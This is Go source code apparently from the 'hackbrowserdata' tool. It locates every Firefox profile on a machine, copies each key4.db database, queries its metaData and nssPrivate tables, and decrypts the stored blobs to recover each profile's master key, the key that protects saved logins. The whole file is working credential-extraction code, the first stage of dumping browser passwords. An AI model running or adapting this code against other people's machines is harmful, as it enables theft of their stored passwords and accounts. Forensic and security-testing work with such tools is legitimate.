package hackbrowserdata

import (
	"bytes"
	"database/sql"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	// import sqlite3 driver
	_ "github.com/mattn/go-sqlite3"

	"github.com/moond4rk/hackbrowserdata/crypto"
	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
)

type firefox struct {
	name               browser
	storage            string
	profilePath        string
	profilePaths       []string
	profilePathKeys    map[string][]byte
	disableFindAllUser bool
	firefoxPassword    []byte
	supportedData      []browserDataType
	supportedDataMap   map[browserDataType]struct{}
}

func (f *firefox) Init() error {
	if err := f.initBrowserData(); err != nil {
		return err
	}
	if err := f.initProfile(); err != nil {
		return fmt.Errorf("profile path '%s' does not exist %w", f.profilePath, ErrBrowserNotExists)
	}
	return f.initMasterKey()
}

func (f *firefox) initBrowserData() error {
	if f.supportedDataMap == nil {
		f.supportedDataMap = make(map[browserDataType]struct{})
	}
	for _, v := range f.supportedData {
		f.supportedDataMap[v] = struct{}{}
	}
	return nil
}

func (f *firefox) initProfile() error {
	if !fileutil.IsDirExists(f.profilePath) {
		return ErrBrowserNotExists
	}
	if !f.disableFindAllUser {
		profilesPaths, err := f.findAllProfiles()
		if err != nil {
			return err
		}
		f.profilePaths = profilesPaths
	} else {
		f.profilePaths = []string{f.profilePath}
	}
	f.profilePathKeys = make(map[string][]byte)
	return nil
}

func (f *firefox) findAllProfiles() ([]string, error) {
	var profiles []string
	root := fileutil.ParentDir(f.profilePath)

	err := filepath.Walk(root, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if strings.HasSuffix(path, "key4.db") {
			profiles = append(profiles, filepath.Dir(path))
		}
		depth := len(strings.Split(path, string(filepath.Separator))) - len(strings.Split(root, string(filepath.Separator)))

		// if the depth is more than 2 and it's a directory, skip it
		if info.IsDir() && path != root && depth >= 3 {
			return filepath.SkipDir
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return profiles, err
}

func (f *firefox) initMasterKey() error {
	for _, profile := range f.profilePaths {
		key, err := f.findMasterKey(profile)
		if err != nil {
			return err
		}
		f.profilePathKeys[profile] = key
	}
	return nil
}

func (f *firefox) findMasterKey(profile string) ([]byte, error) {
	keyPath := filepath.Join(profile, "key4.db")
	if !fileutil.IsFileExists(keyPath) {
		return nil, ErrBrowserNotExists
	}
	if err := fileutil.CopyFile(keyPath, "key4-copy.db"); err != nil {
		return nil, err
	}
	defer os.Remove("key4-copy.db")
	globalSalt, metaBytes, nssA11, nssA102, err := getFirefoxDecryptKey("key4-copy.db")
	if err != nil {
		return nil, err
	}
	metaPBE, err := crypto.NewASN1PBE(metaBytes)
	if err != nil {
		return nil, err
	}

	k, err := metaPBE.Decrypt(globalSalt)
	if err != nil {
		return nil, err
	}
	if bytes.Contains(k, []byte("password-check")) {
		keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
		if bytes.Equal(nssA102, keyLin) {
			nssPBE, err := crypto.NewASN1PBE(nssA11)
			if err != nil {
				return nil, err
			}
			masterKey, err := nssPBE.Decrypt(globalSalt)
			if err != nil {
				return nil, err
			}
			return masterKey, nil
		}
	}
	return nil, nil
}

const (
	queryMetaData   = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	queryNssPrivate = `SELECT a11, a102 from nssPrivate`
)

func getFirefoxDecryptKey(key4file string) (item1, item2, a11, a102 []byte, err error) {
	db, err := sql.Open("sqlite3", key4file)
	if err != nil {
		return nil, nil, nil, nil, err
	}
	defer db.Close()

	if err = db.QueryRow(queryMetaData).Scan(&item1, &item2); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("query metaData failed: %w, query: %s", err, queryMetaData)
	}

	if err = db.QueryRow(queryNssPrivate).Scan(&a11, &a102); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("query nssPrivate failed: %w, query: %s", err, queryNssPrivate)
	}
	return item1, item2, a11, a102, nil
}

func (f *firefox) setDisableAllUsers(e bool) {
	f.disableFindAllUser = e
}

func (f *firefox) setProfilePath(p string) {
	f.profilePath = p
}

func (f *firefox) setStorageName(s string) {
	f.storage = s
}
